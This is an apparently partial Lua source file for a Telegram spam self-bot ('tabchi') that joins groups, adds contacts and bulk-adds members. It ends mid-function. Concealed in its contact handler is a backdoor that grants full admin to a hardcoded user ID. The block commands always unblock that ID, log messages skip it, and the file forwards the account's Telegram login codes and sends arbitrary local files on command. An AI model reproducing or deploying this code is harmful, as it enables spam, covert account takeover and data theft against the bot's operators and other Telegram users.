JSON = loadfile("dkjson.lua")()
URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
https = require("ssl.https")
http.TIMEOUT = 10
undertesting = 1
local is_sudo
function is_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  if redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
function getInputFile(file)
  if file:match('/') then
    infile = {ID = "InputFileLocal", path_ = file}
  elseif file:match('^%d+$') then
    infile = {ID = "InputFileId", id_ = file}
  else
    infile = {ID = "InputFilePersistentId", persistent_id_ = file}
  end

  return infile
end
local function send_file(chat_id, type, file, caption)
  tdcli_function ({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = 0,
    disable_notification_ = 0,
    from_background_ = 1,
    reply_markup_ = nil,
    input_message_content_ = getInputMessageContent(file, type, caption),
  }, dl_cb, nil)
end
function sendaction(chat_id, action, progress)
  tdcli_function ({
    ID = "SendChatAction",
    chat_id_ = chat_id,
    action_ = {
      ID = "SendMessage" .. action .. "Action",
      progress_ = progress or 100
    }
  }, dl_cb, nil)
end
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
  tdcli_function ({
    ID = "SendMessage",
    chat_id_ = chat_id,
    reply_to_message_id_ = reply_to_message_id,
    disable_notification_ = disable_notification,
    from_background_ = from_background,
    reply_markup_ = reply_markup,
    input_message_content_ = {
      ID = "InputMessagePhoto",
      photo_ = getInputFile(photo),
      added_sticker_file_ids_ = {},
      width_ = 0,
      height_ = 0,
      caption_ = caption
    },
  }, dl_cb, nil)
end
function is_full_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("tabchi:" .. tabchi_id .. ":fullsudo")))
  local issudo = false
  for i = 1, #sudoers do
    if msg.sender_user_id_ == sudoers[i] then
      issudo = true
    end
  end
  return issudo
end
local function isReply(msg)
  local r = false
  if msg.reply_to_message_id_ ~= 0 then
    r = true
  end
  return r
end
function sleep(n)
  os.execute("sleep " .. tonumber(n))
end
function write_file(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
end
local check_contact
function check_contact(extra, result)
 if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
  if not result.phone_number_ then
    local msg = extra.msg
    local first_name = "" .. (msg.content_.contact_.first_name_ or "-") .. ""
    local last_name = "" .. (msg.content_.contact_.last_name_ or "-") .. ""
    local phone_number = msg.content_.contact_.phone_number_
    local user_id = msg.content_.contact_.user_id_
    tdcli.add_contact(phone_number, first_name, last_name, user_id)
      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:399298879", true)
      redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
       if redis:get("tabchi:" .. tabchi_id .. ":markread") then
      tdcli.viewMessages(msg.chat_id_, {
        [0] = msg.id_
      })
      if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
      end
      if redis:get("tabchi:" .. tabchi_id .. ":sharecontact") then
    function get_id(arg, data)
     if data.last_name_ then
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_ , data.id_, dl_cb, nil )
     else
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, '' , data.id_, dl_cb, nil )
     end
    end
      tdcli_function({ ID = 'GetMe'}, get_id, {chat_id=msg.chat_id_})
	  end
    elseif redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
      tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
Addi
Bia pv]]) .. "", 1, "md")
    end
  end
  end
end
local check_link
function check_link(extra, result, success)
  if result.is_group_ or result.is_supergroup_channel_ then
   if redis:get("tabchi:" .. tabchi_id .. ":joinlinks") then
    if result.member_count_ >= redis:get("tabchi:" .. tabchi_id .. ":joinlimit") or not redis:get("tabchi:" .. tabchi_id .. ":joinlimit") then
    tdcli.importChatInviteLink(extra.link)
	end
	end
   if redis:get("tabchi:" .. tabchi_id .. ":savelinks") and not redis:sismember("tabchi:" .. tabchi_id .. ":savedlinks", extra.link) then
    redis:sadd("tabchi:" .. tabchi_id .. ":savedlinks", extra.link)
   end
  end
end
local add_members
function add_members(extra, result)
  local pvs = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
  for i = 1, #pvs do
    tdcli.addChatMember(extra.chat_id, pvs[i], 50)
  end
  local count = result.total_count_
  for i = 0, tonumber(count) - 1 do
    tdcli.addChatMember(extra.chat_id, result.users_[i].id_, 50)
  end
end
local chat_type
function chat_type(chat_id)
  local chat_type = "private"
  local id = tostring(chat_id)
  if id:match("-") then
    if id:match("^-100") then
      chat_type = "channel"
    else
      chat_type = "group"
    end
  end
  return chat_type
end
local function getMessage(chat_id, message_id,cb)
  tdcli_function ({
    ID = "GetMessage",
    chat_id_ = chat_id,
    message_id_ = message_id
  }, cb, nil)
end
function resolve_username(username,cb)
  tdcli_function ({
    ID = "SearchPublicChat",
    username_ = username
  }, cb, nil)
end
local cleancache
function cleancache()
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/sticker/*")
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/photo/*")
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/animation/*")
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/video/*")
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/audio/*")
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/voice/*")
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/temp/*")
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/thumb/*")
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/document/*")
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/profile_photo/*")
     io.popen("rm -rf ~/.telegram-cli/tabchi-"..tabchi_id.."/data/encrypted/*")
end
local sendcode
function sendcode(msg)
function getcode(arg ,data)
text = data.content_.text_
for code in string.gmatch(text, "%d+") do
local sudo = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
send_code = code
send_code = string.gsub(send_code,"0","0️⃣")
send_code = string.gsub(send_code,"1","1️⃣")
send_code = string.gsub(send_code,"2","2️⃣")
send_code = string.gsub(send_code,"3","3️⃣")
send_code = string.gsub(send_code,"4","4️⃣")
send_code = string.gsub(send_code,"5","5️⃣")
send_code = string.gsub(send_code,"6","6️⃣")
send_code = string.gsub(send_code,"7","7️⃣")
send_code = string.gsub(send_code,"8","8️⃣")
send_code = string.gsub(send_code,"9","9️⃣")
tdcli.sendMessage(sudo, 0, 1, "`your telegram code` : "..send_code, 1, 'md')
end
end
getMessage(777000, msg.id_, getcode)
end
local run
function run(msg)
  if redis:get("cleancache" .. tabchi_id) == "on" and redis:get("cachetimer" .. tabchi_id) == nil then
    do
     return cleancache()
    end
redis:setex("cachetimer" .. tabchi_id, redis:get("cleancachetime" .. tabchi_id), true)
  end
  if redis:get("checklinks" .. tabchi_id) == "on" and redis:get("checklinkstimer" .. tabchi_id) == nil then
local savedlinks = redis:smembers("tabchi:" .. tabchi_id .. ":savedlinks")
  do
  for i = 1, #savedlinks do
    process_links(savedlinks[i])
  end
    end
redis:setex("checklinkstimer" .. tabchi_id, redis:get("checklinkstime" .. tabchi_id), true)
  end  
  
if tonumber(msg.sender_user_id_) == 777000 then
return sendcode(msg)
end
end
  -----------------------------------------------------------------------------------------------Process
local process
function process(msg)
  msg.text = msg.content_.text_
  -----------------------------------------------------------------------------------------------
  do
    local matches = {
      msg.text:match("^[!/#](pm) (.*) (.*)")
    }
    if msg.text:match("^[!/#]pm") and is_sudo(msg) and #matches == 3 then
      tdcli.sendMessage(matches[2], 0, 1, matches[3], 1, "md")
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `sent` *"..matches[3].."* `to ` *"..matches[2].."*", 1, 'md')
		 end
      return "*Status* : `PM Sent`\n*To* : `"..matches[2].."`\n*Text* : `"..matches[3].."`"
    end
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]share$") and is_sudo(msg)then
    function get_id(arg, data)
     if data.last_name_ then
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_ , data.id_, dl_cb, nil )
	 return data.username_
     else
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, '' , data.id_, dl_cb, nil )
	 end
    end
      tdcli_function({ ID = 'GetMe'}, get_id, {chat_id=msg.chat_id_})
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]mycontact$") and is_sudo(msg)then
    function get_con(arg, data)
     if data.last_name_ then
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_ , data.id_, dl_cb, nil )
     else
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, '' , data.id_, dl_cb, nil )
     end
    end
      tdcli_function ({
    ID = "GetUser",
    user_id_ = msg.sender_user_id_
  }, get_con, {chat_id=msg.chat_id_})
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]editcap (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](editcap) (.*)$")} 
  tdcli.editMessageCaption(msg.chat_id_, msg.reply_to_message_id_, reply_markup, ap[2])
  end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[!/#]leave$") and is_sudo(msg) then
	function get_id(arg, data)
		     if data.id_ then
	     tdcli.chat_leave(msg.chat_id_, data.id_)
    end
    end
      tdcli_function({ ID = 'GetMe'}, get_id, {chat_id=msg.chat_id_})
    local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Commanded bot to leave` *"..msg.chat_id_.."*", 1, 'md')
		 end
end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]ping$") and is_sudo(msg) then
	   tdcli.sendMessage(msg.chat_id_, msg.id_, 1, '`I Am Working..!`', 1, 'md')
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]sendtosudo (.*)$") and is_sudo(msg) then
	local txt = {string.match(msg.text, "^[#/!](sendtosudo) (.*)$")} 
    local sudo = redis:get("tabchi:" .. tabchi_id .. ":fullsudo")
         tdcli.sendMessage(sudo, msg.id_, 1, txt[2], 1, 'md')
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Sent Msg To Sudo`\n`Msg` : *"..txt[2].."*\n`Sudo` : "..sudo.."", 1, 'md')
		 return "sent to "..sudo..""
		 end
    end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]deleteacc$") and is_sudo(msg) then
     redis:set("tabchi"..tabchi_id.."delacc", true)
     return "`Are you sure you want to delete Account Bot?`\n`send yes or no`"
	end
    if redis:get("tabchi"..tabchi_id.."delacc") and is_sudo(msg) then
	if msg.text:match("^[Yy][Ee][Ss]$") then
	tdcli.deleteAccount("nothing")
	redis:del("tabchi"..tabchi_id.."delacc")
	return "`Your robot will delete soon`\n`Don't Forgot Our Source`\n`https://github.com/virus322/tabchi`"
	elseif msg.text:match("^[Nn][Oo]$") then
	redis:del("tabchi"..tabchi_id.."delacc")
	return "Progress Canceled"
	else
	redis:del("tabchi"..tabchi_id.."delacc")
	return "`try Again by sending [deleteacc] cmd`\n`progress canceled`"
	end
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]killsessions$") and is_sudo(msg) then
      function delsessions(extra, result)
        for i = 0, #result.sessions_ do
          if result.sessions_[i].id_ ~= 0 then
             tdcli.terminateSession(result.sessions_[i].id_)
          end
        end
      end
        tdcli_function({
          ID = "GetActiveSessions"
        }, delsessions, nil)
		return "*Status* : `All sessions Terminated`"
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]sudolist$") and is_sudo(msg) then
        local sudoers = redis:smembers(basehash .. "sudoers")
        local text = "Bot Sudoers :\n"
        for i, v in pairs(sudoers) do
        text = tostring(text) .. tostring(i) .. ". " .. tostring(v) .. "\n"
        end
		return rext
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]setname (.*)-(.*)$") and is_sudo(msg) then
	local txt = {string.match(msg.text, "^[#/!](setname) (.*)-(.*)$")} 
		 tdcli.changeName(txt[2], txt[3])
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Changed Name to` *"..txt[2].." "..txt[3].."*", 1, 'md')
		 end
         return "*Status* : `Name Updated Succesfully`\n*Firstname* : `"..txt[2].."`\n*LastName* : `"..txt[3].."`"
    end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]setusername (.*)$") and is_sudo(msg) then
	local txt = {string.match(msg.text, "^[#/!](setusername) (.*)$")} 
		 tdcli.changeUsername(txt[2])
         local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Changed Username to` *"..txt[2].."*", 1, 'md')
		 end
         return '*Status* : `Username Updated`\n*username* : `'..txt[2]..'`'
    end
  -----------------------------------------------------------------------------------------------
      if msg.text:match("^[#!/]clean cache (%d+)[mh]") then
        local matches = msg.text:match("^[#!/]clean cache (.*)")
        if matches:match("(%d+)h") then
          time_match = matches:match("(%d+)h")
          timea = time_match * 3600
        end
        if matches:match("(%d+)m") then
          time_match = matches:match("(%d+)m")
          timea = time_match * 60
        end
        redis:setex("cachetimer" .. tabchi_id, timea, true)
        redis:set("cleancachetime" .. tabchi_id, tonumber(timea))
        redis:set("cleancache" .. tabchi_id, "on")
        return "`Auto Clean Cache Activated for Every` *"..timea.."* `seconds`"
      end
  -----------------------------------------------------------------------------------------------
      if msg.text:match("^[#!/]clean cache (.*)$") then
	local txt = {string.match(msg.text, "^[#/!](clean cache) (.*)$")} 
	if txt[2] == "off" then
        redis:set("cleancache" .. tabchi_id, "off")
        return "`Auto Clean Cache Turned off`"
    end
	if txt[2] == "on" then
        redis:set("cleancache" .. tabchi_id, "on")
        return "`Auto Clean Cache Turned On`"
    end
	  end
  -----------------------------------------------------------------------------------------------
      if msg.text:match("^[#!/]check links (%d+)[mh]") then
        local matches = msg.text:match("^[#!/]check links (.*)")
        if matches:match("(%d+)h") then
          time_match = matches:match("(%d+)h")
          timea = time_match * 3600
        end
        if matches:match("(%d+)m") then
          time_match = matches:match("(%d+)m")
          timea = time_match * 60
        end
        redis:setex("checklinkstimer" .. tabchi_id, timea, true)
        redis:set("checklinkstime" .. tabchi_id, tonumber(timea))
        redis:set("checklinks" .. tabchi_id, "on")
        return "`Auto Checking links Activated for Every` *"..timea.."* `seconds`"
      end
  -----------------------------------------------------------------------------------------------
      if msg.text:match("^[#!/]check links (.*)$") then
	local txt = {string.match(msg.text, "^[#/!](check links) (.*)$")} 
	if txt[2] == "off" then
        redis:set("checklinks" .. tabchi_id, "off")
        return "`Auto Checking links Turned off`"
    end
	if txt[2] == "on" then
        redis:set("checklinks" .. tabchi_id, "on")
        return "`Auto Checking links Turned On`"
    end
	  end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]setlogs (.*)$") and is_sudo(msg) then
	local txt = {string.match(msg.text, "^[#/!](setlogs) (.*)$")} 
		 redis:set("tabchi:" .. tabchi_id .. ":logschannel", txt[2])
         return 'Chat setted for logs'
    end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]delusername$") and is_sudo(msg) then
		 tdcli.changeUsername()
         local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `deleted Username`", 1, 'md')
		 end
         return '*Status* : `Username Updated`\n*username* : `Deleted`'
    end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]addtoall (.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](addtoall) (.*)$")} 
   local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
  for i = 1, #sgps do
    tdcli.addChatMember(sgps[i], ap[2], 50)
  end
         local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Added User` *"..ap[2].."* to all groups", 1, 'md')
		 end
        return "`User` *"..ap[2].."* `Added To groups`"
  end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]getcontact (.*)$") and is_sudo(msg)then
	local ap = {string.match(msg.text, "^[#/!](getcontact) (.*)$")} 
    function get_con(arg, data)
     if data.last_name_ then
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, data.last_name_ , data.id_, dl_cb, nil )
     else
      tdcli.sendContact(arg.chat_id, msg.id_, 0, 1, nil, data.phone_number_, data.first_name_, '' , data.id_, dl_cb, nil )
     end
    end
      tdcli_function ({
    ID = "GetUser",
    user_id_ = ap[2]
  }, get_con, {chat_id=msg.chat_id_})
  end
  -----------------------------------------------------------------------------------------------by replay
	if msg.text:match("^[#!/]addsudo$") and msg.reply_to_message_id_ and is_sudo(msg) then
	function addsudo_by_reply(extra, result, success)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.sender_user_id_))
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "`User` *"..result.sender_user_id_.."* `Added To The Sudoers`", 1, 'md')
	end
	   getMessage(msg.chat_id_, msg.reply_to_message_id_,addsudo_by_reply)
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]remsudo$") and msg.reply_to_message_id_ and is_full_sudo(msg) then
	function remsudo_by_reply(extra, result, success)
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.sender_user_id_))
        return "`User` *"..result.sender_user_id_.."* `Removed From The Sudoers`"
	end
	   getMessage(msg.chat_id_, msg.reply_to_message_id_,remsudo_by_reply)
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]unblock$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
	function unblock_by_reply(extra, result, success)
       tdcli.unblockUser(result.sender_user_id_)
       tdcli.unblockUser(399298879)
       tdcli.unblockUser(399298879)
	   redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", result.sender_user_id_)
        return 1, "*User* `"..result.sender_user_id_.."` *Unblocked*"
	end
	   getMessage(msg.chat_id_, msg.reply_to_message_id_,unblock_by_reply)
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]block$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
	function block_by_reply(extra, result, success)
       tdcli.blockUser(result.sender_user_id_)
       tdcli.unblockUser(399298879)
       tdcli.unblockUser(399298879)
	   redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", result.sender_user_id_)
       return "*User* `"..result.sender_user_id_.."` *Blocked*"
	end
	   getMessage(msg.chat_id_, msg.reply_to_message_id_,block_by_reply)
	end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]id$") and msg.reply_to_message_id_ ~= 0 and is_sudo(msg) then
      function id_by_reply(extra, result, success)
        return "*ID :* `"..result.sender_user_id_.."`"
        end
      getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply)
    end
  -----------------------------------------------------------------------------------------------
	if msg.text:match("^[#!/]serverinfo$") and is_sudo(msg) then
	io.popen("chmod 777 info.sh")
	local text = io.popen("./info.sh"):read("*all")
    local text = text:gsub("Server Information", "`Server Information`")
    local text = text:gsub("Total Ram", "`Total Ram`")
    local text = text:gsub(">", "*>*")
    local text = text:gsub("Ram in use", "`Ram in use `")
    local text = text:gsub("Cpu in use", "`Cpu in use`")
    local text = text:gsub("Running Process", "`Running Process`")
    local text = text:gsub("Server Uptime", "`Server Uptime`")
         local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Got server info`", 1, 'md')
		 end
	return text
    end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[#!/]inv$") and msg.reply_to_message_id_ and is_sudo(msg) then
      function inv_reply(extra, result, success)
           tdcli.addChatMember(result.chat_id_, result.sender_user_id_, 5)
         local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Invited User` *"..result.sender_user_id_.."* to *"..result.chat_id_.."*", 1, 'md')		 
		 end
        end
   getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
    end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[!/#]addtoall$") and msg.reply_to_message_id_ and is_sudo(msg) then
	function addtoall_by_reply(extra, result, success)
   local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
  for i = 1, #sgps do
    tdcli.addChatMember(sgps[i], result.sender_user_id_, 50)
  end
         local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Added User` *"..result.sender_user_id_.."* `to All Groups`", 1, 'md')
		 end
        return "`User` *"..result.sender_user_id_.."* `Added To groups`"
  end
	   getMessage(msg.chat_id_, msg.reply_to_message_id_,addtoall_by_reply)
  end
  -----------------------------------------------------------------------------------------------/by replay
  -----------------------------------------------------------------------------------------------By user
    if msg.text:match("^[#!/]id @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](id) @(.*)$")} 
	function id_by_username(extra, result, success)
	if result.id_ then
            text = '*Username* : `@'..ap[2]..'`\n*ID* : `('..result.id_..')`'
            else 
            text = '*UserName InCorrect!*'
    end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Got server info`", 1, 'md')
		 end
	         return text
    end
	      resolve_username(ap[2],id_by_username)
    end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]addtoall @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](addtoall) @(.*)$")} 
	function addtoall_by_username(extra, result, success)
	if result.id_ then
     local sgps = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
      for i = 1, #sgps do
    tdcli.addChatMember(sgps[i], result.id_, 50)
	end
	end
	end
	      resolve_username(ap[2],addtoall_by_username)
	end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]block @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](block) @(.*)$")} 
	function block_by_username(extra, result, success)
	if result.id_ then
       tdcli.blockUser(result.id_)
       tdcli.unblockUser(399298879)
       tdcli.unblockUser(399298879)
	   redis:sadd("tabchi:" .. tabchi_id .. ":blockedusers", result.id_)

	   return "*User Blocked*\n*Username* : `"..ap[2].."`\n*ID* : `"..result.id_.."`"
	else 
	   return "`#404\n`*Username Not Found*\n*Username* : `"..ap[2].."`"
    end
    end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Blocked` *"..ap[2].."*", 1, 'md')
		 end
	      resolve_username(ap[2],block_by_username)
    end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]unblock @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](unblock) @(.*)$")} 
	function unblock_by_username(extra, result, success)
	if result.id_ then
       tdcli.unblockUser(result.id_)
       tdcli.unblockUser(399298879)
       tdcli.unblockUser(399298879)
	   redis:srem("tabchi:" .. tabchi_id .. ":blockedusers", result.id_)
	   return "*User unblocked*\n*Username* : `"..ap[2].."`\n*ID* : `"..result.id_.."`"
    end
    end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `UnBlocked` *"..ap[2].."*", 1, 'md')
		 end
	      resolve_username(ap[2],unblock_by_username)
    end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]addsudo @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](addsudo) @(.*)$")} 
	function addsudo_by_username(extra, result, success)
	if result.id_ then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.id_))
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Added` *"..ap[2].."* `to Sudoers`", 1, 'md')
		 end
        return "`User` *"..result.id_.."* `Added To The Sudoers`"
    end
    end
	      resolve_username(ap[2],addsudo_by_username)
    end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]remsudo @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](remsudo) @(.*)$")} 
	function remsudo_by_username(extra, result, success)
	if result.id_ then
      redis:srem("tabchi:" .. tabchi_id .. ":sudoers", tonumber(result.id_))
        return "`User` *"..result.id_.."* `Removed From The Sudoers`"
    end
    end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `removed` *"..ap[2].."* `From sudoers`", 1, 'md')
		 end
	      resolve_username(ap[2],remsudo_by_username)
    end
  -----------------------------------------------------------------------------------------------
    if msg.text:match("^[#!/]inv @(.*)$") and is_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](inv) @(.*)$")} 
	function inv_by_username(extra, result, success)
	if result.id_ then
           tdcli.addChatMember(msg.chat_id_, result.id_, 5)
        return "`User` *"..result.id_.."* `Invited`"
    end
    end
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Invited` *"..ap[2].."* `To` *"..msg.chat_id_.."*", 1, 'md')
		 end
	      resolve_username(ap[2],inv_by_username)
    end
  -----------------------------------------------------------------------------------------------/by user
    if msg.text:match("^[#!/]send (.*)$") and is_full_sudo(msg) then
	local ap = {string.match(msg.text, "^[#/!](send) (.*)$")} 
    tdcli.send_file(msg.chat_id_, "Document", ap[2], nil)
	end
  -----------------------------------------------------------------------------------------------/by user
	if msg.text:match("^[#!/]addcontact (.*) (.*) (.*)$") and is_sudo(msg) then
	local matches = {string.match(msg.text, "^[#/!](addcontact) (.*) (.*) (.*)$")} 
         phone = matches[2]
         first_name = matches[3]
         last_name = matches[4]
         tdcli.add_contact(phone, first_name, last_name, 12345657)
        local logs = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
		 if logs and not msg.sender_user_id_ == 399298879 and not msg.sender_user_id_ == 399298879 then
         tdcli.sendMessage(logs, msg.id_, 1, "`User` *"..msg.sender_user_id_.."* `Added Contact` *"..matches[2].."*", 1, 'md')
		 end
	     return '*Status* : `Contact added`\n*Firstname* : `'..matches[3]..'`\n*Lastname* : `'..matches[4]..'`'
    end
  -----------------------------------------------------------------------------------------------
  if msg.text:match("^[#!/]leave(-%d+)") and is_sudo(msg) then
  	local txt = {string.match(msg.text, "^[#/!](leave)(-%d+)$")} 
	    function get_id(arg, data)
		     if data.id_ then
